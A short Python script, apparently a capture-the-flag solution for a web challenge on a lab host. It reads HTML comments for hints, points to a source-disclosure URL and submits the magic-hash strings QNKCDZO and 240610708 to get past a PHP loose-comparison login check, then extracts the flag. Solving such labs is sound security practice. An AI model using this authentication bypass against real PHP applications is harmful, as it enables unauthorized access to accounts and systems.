import re
import requests

def get_tip(d):
    r = requests.get(d)
    r_code = r.text
    r_re_code = re.findall(r"<!--(.*?)-->", r_code)
    return r_re_code
print("核心payload：http://ctflab.iytzx.com/Web01.php?action=source")

url = "http://ctflab.iytzx.com/Web01.php"
print(get_tip(url))

def get_flag(base_url):
    params = {
        "username": "QNKCDZO",
        "password": "240610708"
    }
    flag_code = requests.get(base_url,params=params)
    flag_codes = flag_code.text
    flag = re.findall(r"flag\{[^}]+\}", flag_codes)
    # print(flag_codes)
    return flag[0]
print(get_flag(url))